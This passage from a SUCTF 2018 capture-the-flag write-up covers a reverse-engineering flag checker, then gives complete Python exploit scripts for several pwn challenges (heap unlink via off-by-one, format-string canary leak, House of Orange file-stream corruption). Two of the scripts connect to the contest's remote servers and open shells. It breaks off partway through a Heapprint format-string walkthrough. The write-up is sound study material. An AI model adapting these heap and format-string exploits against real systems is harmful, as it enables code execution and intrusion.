class="number">0x9</span>,<span class="number">0x3</span>,<span class="number">0x5F</span>,<span class="number">0x24</span>,<span class="number">0x36</span>,<span class="number">0x30</span>,<span class="number">0x44</span>,<span class="number">0xd</span>,<span class="number">0x14</span>,<span class="number">0x41</span>,<span class="number">0x60</span>,<span class="number">0x08</span>,<span class="number">0x20</span>,<span class="number">0x28</span>,<span class="number">0x36</span>,<span class="number">0x39</span>,<span class="number">0x18</span>,<span class="number">0x37</span>,<span class="number">0x2e</span>,<span class="number">0x49</span>,<span class="number">0x1e</span>,<span class="number">0x01</span>,<span class="number">0x06</span>]</span><br><span class="line">cipher = <span class="string">'MasterMeihasAlargeSecretGardenfortHeTeamSU,canUfindit'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	tmp = chr((((guess[i]-i%<span class="number">10</span>)&amp;<span class="number">0xff</span>)^ord(cipher[i])))</span><br><span class="line">	ans += tmp</span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure>
<p>得到<a href="http://qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip。" target="_blank" rel="noopener">http://qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip。</a></p>
<p>解压得到的程序是一个pyinstaller打包的程序，使用pyinstxtractor解包，得到其的pyc文件，pyc文件缺失文件头标志和时间戳，补上即可，时间戳可以随意，我是用自己编译pyc文件的时间戳，使用uncompyle2即可得到py文件如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2018.05.27 18:53:29 ÖÐ¹ú±ê×¼Ê±¼ä</span></span><br><span class="line"><span class="comment">#Embedded file name: RubberDucky.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">print</span> <span class="string">'#####   #     #                                                 #####                                     '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'#     # #     #     ####  ######  ####  #####  ###### #####    #     #   ##   #####  #####  ###### #    # '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'#       #     #    #      #      #    # #    # #        #      #        #  #  #    # #    # #      ##   # '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">' #####  #     #     ####  #####  #      #    # #####    #      #  #### #    # #    # #    # #####  # #  # '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'      # #     #         # #      #      #####  #        #      #     # ###### #####  #    # #      #  # # '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'#     # #     #    #    # #      #    # #   #  #        #      #     # #    # #   #  #    # #      #   ## '</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">' #####   #####      ####  ######  ####  #    # ######   #       #####  #    # #    # #####  ###### #    # '</span></span><br><span class="line">introduction = <span class="string">'Je suis la garde du jardin'</span></span><br><span class="line">question = <span class="string">'Donnez-moi FLAG avant de pouvoir y aller'</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">os.system(<span class="string">'cls'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Garde:'</span> + introduction</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Garde:'</span> + question</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">b = <span class="string">''</span></span><br><span class="line">cipher = <span class="string">'YVGQF|1mooH.hXk.SebfQU`^WL)J[\\(`'</span></span><br><span class="line">flag = raw_input(<span class="string">'You:'</span>)</span><br><span class="line"><span class="keyword">if</span> len(flag) != <span class="number">32</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'It has 32 words'</span></span><br><span class="line">    os.system(<span class="string">'exit'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    b += chr(ord(flag[i]) + ord(flag[i]) % <span class="number">4</span> * <span class="number">2</span> - i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> b == cipher:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Garde:'</span> + <span class="string">'Correct flag! Welcome my friend, Meizijiu Shifu appreciates your visiting here!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Garde:'</span> + <span class="string">'Noooo!Stranger!!Get out!'</span></span><br><span class="line">+++ okay decompyling test.pyc </span><br><span class="line"><span class="comment"># decompiled 1 files: 1 okay, 0 failed, 0 verify failed</span></span><br><span class="line"><span class="comment"># 2018.05.27 18:53:29</span></span><br></pre></td></tr></table></figure>
<p>写解密脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = string.printable</span><br><span class="line">cipher = <span class="string">'YVGQF|1mooH.hXk.SebfQU`^WL)J[\\(`'</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> group <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	<span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line">		tmp = ord(ch) + (ord(ch) % <span class="number">4</span>) * <span class="number">2</span> - group</span><br><span class="line">		<span class="keyword">if</span> tmp &lt; <span class="number">127</span>:</span><br><span class="line">			<span class="keyword">if</span> chr(tmp) == cipher[group]:</span><br><span class="line">				ans += ch</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"></span><br><span class="line"><span class="comment">#SUCTF&#123;5tuxN3t_s7arts_from_A_usB&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h3><p>pwn-heap:</p>
<p>难度：中等</p>
<p>考点：off by one技巧的应用、unlink知识点</p>
<p>漏洞点：在creat函数中 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"input your data"</span>);     </span><br><span class="line">read(<span class="number">0</span>, nbytes_4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);      </span><br><span class="line"><span class="built_in">strcpy</span>((<span class="keyword">char</span> *)s, (<span class="keyword">const</span> <span class="keyword">char</span> *)nbytes_4);</span><br></pre></td></tr></table></figure>
<p>在输入数据时，会先将数据输进临时的堆块中，并且没有在数据末尾加入00，           而后将数据strcpy进新建的堆中。因此，如果数据填满了临时的堆块空间，strcp         y就会把临时块下一块的size字段加入数据拷贝到新建的堆中。这样新建堆的下一         个堆就会被改变size字段，当是释放被改变size的堆时，依据size对进行下一个         堆是否占用检查就会出错，合理构造，可以进行unlink攻击，而后进行got表修改         ，完成rip劫持，得到shell<br>利用脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span><span class="params">(io,length,payload)</span>:</span></span><br><span class="line">  io.read_until(<span class="string">'3:show'</span>)</span><br><span class="line">  io.writeline(<span class="string">'1'</span>)</span><br><span class="line">  io.read_until(<span class="string">'input len'</span>)</span><br><span class="line">  io.writeline(str(length))</span><br><span class="line">  io.read_until(<span class="string">'input your data'</span>)</span><br><span class="line">  io.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delet</span><span class="params">(io,index)</span>:</span></span><br><span class="line">  io.read_until(<span class="string">'3:show'</span>)</span><br><span class="line">  io.writeline(<span class="string">'2'</span>)</span><br><span class="line">  io.read_until(<span class="string">'input id'</span>)</span><br><span class="line">  io.writeline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(io,index,payload)</span>:</span></span><br><span class="line">  io.read_until(<span class="string">'3:show'</span>)</span><br><span class="line">  io.writeline(<span class="string">'4'</span>)</span><br><span class="line">  io.read_until(<span class="string">'input id'</span>)</span><br><span class="line">  io.writeline(index)</span><br><span class="line">  io.read_until(<span class="string">'input your data'</span>)</span><br><span class="line">  io.write(payload)</span><br><span class="line">  </span><br><span class="line">target=(<span class="string">'./test'</span>)</span><br><span class="line">io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW, <span class="string">'red'</span>), print_write=COLORED(RAW, <span class="string">'green'</span>))</span><br><span class="line">c2=raw_input(<span class="string">"go?"</span>)</span><br><span class="line"></span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'2'</span>*<span class="number">0x10</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'3'</span>*<span class="number">0x10</span>)</span><br><span class="line">creat(io,<span class="number">0xb0</span>,<span class="string">'4'</span>*<span class="number">0x10</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'5'</span>*<span class="number">0x10</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'6'</span>*<span class="number">0x10</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0xa0</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'libc:%13$lx'</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">creat(io,<span class="number">0xa0</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delet(io,<span class="string">'5'</span>)</span><br><span class="line">delet(io,<span class="string">'4'</span>)</span><br><span class="line">creat(io,<span class="number">0xb8</span>,<span class="string">'8'</span>*<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">edit(io,<span class="string">'7'</span>,l64(<span class="number">0x0</span>)+l64(<span class="number">0x91</span>)+l64(<span class="number">0x6020e0</span>)+l64(<span class="number">0x6020e8</span>)+<span class="string">'1'</span>*<span class="number">0x70</span>+l64(<span class="number">0x90</span>)+l64(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">delet(io,<span class="string">'6'</span>)</span><br><span class="line">edit(io,<span class="string">'7'</span>,l64(<span class="number">0x602030</span>))</span><br><span class="line">io.writeline(<span class="string">'t'</span>)</span><br><span class="line"></span><br><span class="line">edit(io,<span class="string">'4'</span>,<span class="string">'\x30\x07\x40\x00\x00\x00'</span>)</span><br><span class="line">edit(io,<span class="string">'8'</span>,<span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">io.read_until(<span class="string">'libc:'</span>)</span><br><span class="line">test=io.read(<span class="number">12</span>)</span><br><span class="line">system=int(test,<span class="number">16</span>)<span class="number">-0x20830</span>+<span class="number">0x45390</span></span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">edit(io,<span class="string">'7'</span>,<span class="string">'\x18\x20\x60'</span>)</span><br><span class="line">edit(io,<span class="string">'4'</span>,l64(system))</span><br><span class="line">io.writeline(<span class="string">'t'</span>)</span><br><span class="line">delet(io,<span class="string">'0'</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<h3 id="lock"><a href="#lock" class="headerlink" title="lock"></a>lock</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./lock2')</span></span><br><span class="line">p=remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20001</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'123456'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'K  '</span>)</span><br><span class="line">k=p.recvuntil(<span class="string">'--'</span>)[:<span class="number">-2</span>]</span><br><span class="line">k=int(k,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(k)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'aa%7$hhn'</span>+p64(k))</span><br><span class="line">p.sendline(<span class="string">'aa%7$hhn'</span>+p64(k+<span class="number">4</span>))</span><br><span class="line">p.sendline(<span class="string">'aa%7$hhn'</span>+p64(k+<span class="number">20</span>))</span><br><span class="line">p.recvuntil(<span class="string">'The Pandora Box:'</span>)</span><br><span class="line"></span><br><span class="line">addr=p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">addr=int(addr,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pandora:0x%x"</span>%addr</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">24</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">24</span>+<span class="string">'\n'</span>)</span><br><span class="line">can = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u64(can))</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">34</span>+can+<span class="string">'a'</span>*<span class="number">8</span>+p64(addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#libc=ELF('./lib/libc-2.24.so')</span></span><br><span class="line"><span class="comment">#p=process('./note',env=&#123;'LD_PRELOAD':'./lib/libc-2.24.so'&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">'./libc6_2.24-12ubuntu1_amd64.so'</span>)</span><br><span class="line"><span class="comment">#p=process('./note',env=&#123;'LD_PRELOAD':'./libc6_2.24-12ubuntu1_amd64.so'&#125;)</span></span><br><span class="line">p=remote(<span class="string">'pwn.suctf.asuri.org'</span>,<span class="number">20003</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(l))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(yes:1)'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">addr=p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">addr=(u64(addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)))</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"></span><br><span class="line">libc_base = addr <span class="number">-3930968</span><span class="comment">#3939160#- 3767128 #3939160</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">real_io_list=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(real_io_list)</span><br><span class="line">real_io_stdin_buf_base=libc_base+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]+<span class="number">0x40</span></span><br><span class="line">real_system=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">real_binsh=libc_base+next(libc.search(<span class="string">'/bin/sh'</span>),)<span class="comment">#0x18AC40</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">'a'</span>)</span><br><span class="line">raw_input(<span class="string">'step1,press any key to continue'</span>)</span><br><span class="line">add(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xee1</span>))</span><br><span class="line">raw_input(<span class="string">'step2,press any key to continue'</span>)</span><br><span class="line">add(<span class="number">0x1000</span><span class="number">-8</span>,<span class="string">'b'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(<span class="number">0xddaa</span>)+p64(real_io_list<span class="number">-0x10</span>))</span><br><span class="line">raw_input(<span class="string">'step3,press any key to continue'</span>)</span><br><span class="line">    <span class="comment">#do_one(io,0x90-8,'a'*0x10)</span></span><br><span class="line">fake_chunk=<span class="string">'\x00'</span>*<span class="number">8</span>+p64(<span class="number">0x61</span>) </span><br><span class="line">fake_chunk+=p64(<span class="number">0xddaa</span>)+p64(real_io_list<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">0xffffffffffffff</span>)+p64(<span class="number">0x2</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64( (real_binsh<span class="number">-0x64</span>)/<span class="number">2</span> )</span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(real_system+<span class="number">0x420</span>)</span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">1</span>)</span><br><span class="line">vtable_addr=libc_base+<span class="number">0x3bc4c0</span><span class="comment">#0x3BE4C0</span></span><br><span class="line">payload =fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(vtable_addr)</span><br><span class="line">payload += p64(real_system)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(real_system)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span><span class="number">-8</span>,<span class="string">'c'</span>*<span class="number">0x80</span>+payload )</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'16'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Heapprint"><a href="#Heapprint" class="headerlink" title="Heapprint"></a>Heapprint</h3><p>I made two challenges for SUCTF this year. I got the ideas when I was exploring linux pwn technique and I want to share them with others. Though the logic of the challenges are extremely easy, the exploitation may be a little hard. Since only two teams solved one of the challenge and nobody solved the other, I decide to write a wp for them. If you like the writeup, follow me on <a href="https://github.com/Changochen" target="_blank" rel="noopener">github</a> ^_^</p>
<p>This challenge is about format-string vuln. No leak. Trigger fmt once and get the shell? How is it even possible?</p>
<h4 id="Program-info"><a href="#Program-info" class="headerlink" title="Program info"></a>Program info</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/home/ne0/Desktop/heapprint/heapprint'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>The logic is still simple:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> d;</span><br><span class="line">d=(<span class="keyword">long</span> <span class="keyword">long</span>)&amp;d;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,(d&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xFF</span>);</span><br><span class="line">d=<span class="number">0</span>;</span><br><span class="line">buffer=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">read(<span class="number">0</span>,buffer,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">snprintf</span>(bss_buf,<span class="number">0x100</span>,buffer);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Byebye"</span>);</span><br></pre></td></tr></table></figure>
<h4 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h4><p>Well, fmt obviously.</p>
<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>We can only trigger fmt once. As the fmt needs some pointer at the stack, let’s take a look in gdb then.</p>
<p>Set a breakpoint at snprintf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x55d16cc14a85:	mov    esi,0x100</span><br><span class="line">   0x55d16cc14a8a:	lea    rdi,[rip+0x2005cf]        <span class="comment"># 0x55d16ce15060</span></span><br><span class="line">   0x55d16cc14a91:	mov    eax,0x0</span><br><span class="line">=&gt; 0x55d16cc14a96:	call   0x55d16cc14838</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7ffc6b683860 --&gt; 0x0 </span><br><span class="line">0008| 0x7ffc6b683868 --&gt; 0xe99930963f8b8e00 </span><br><span class="line">0016| 0x7ffc6b683870 --&gt; 0x55d16cc14ad0 (push   r15)</span><br><span class="line">0024| 0x7ffc6b683878 --&gt; 0x7f8cf2942830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0032| 0x7ffc6b683880 --&gt; 0x1 </span><br><span class="line">0040| 0x7ffc6b683888 --&gt; 0x7ffc6b683958 --&gt; 0x7ffc6b684fc0 (<span class="string">"./heapprint"</span>)</span><br><span class="line">0048| 0x7ffc6b683890 --&gt; 0x1f2f11ca0 </span><br><span class="line">.......</span><br><span class="line">0144| 0x7ffc6b6838f0 --&gt; 0x0 </span><br><span class="line">0152| 0x7ffc6b6838f8 --&gt; 0x7ffc6b683968 --&gt; 0x7ffc6b684fcc (<span class="string">"MYVIMRC=/home/ne0/.vimrc"</span>)</span><br><span class="line">0160| 0x7ffc6b683900 --&gt; 0x7f8cf2f13168 --&gt; 0x55d16cc14000 --&gt; 0x10102464c457f </span><br><span class="line">0168| 0x7ffc6b683908 --&gt; 0x7f8cf2cfc7cb (&lt;_dl_init+139&gt;:	jmp    0x7f8cf2cfc7a0 &lt;_dl_init+96&gt;)</span><br><span class="line">.......</span><br><span class="line">0232| 0x7ffc6b683948 --&gt; 0x1c </span><br><span class="line">0240| 0x7ffc6b683950 --&gt; 0x1 </span><br><span class="line">0248| 0x7ffc6b683958 --&gt; 0x7ffc6b684fc0 (<span class="string">"./heapprint"</span>)</span><br></pre></td></tr></table></figure>
<p>Well, we find a pointer to pointer at <code>0x40</code>. So it’s easy to come up with the idea that try to modify the pointer at <code>0248</code> to be <code>0x7ffc6b683878</code>, which pointers to the return address of main. Then modify it to be one gadget to get the shell.</p>
<p>Easier said than done. Let’s try solving it. To better demonstrate the poc, I will turn off aslr in gdb(Otherwise we will need to bruteforce 4 bit to correctly locate the address of return address)</p>
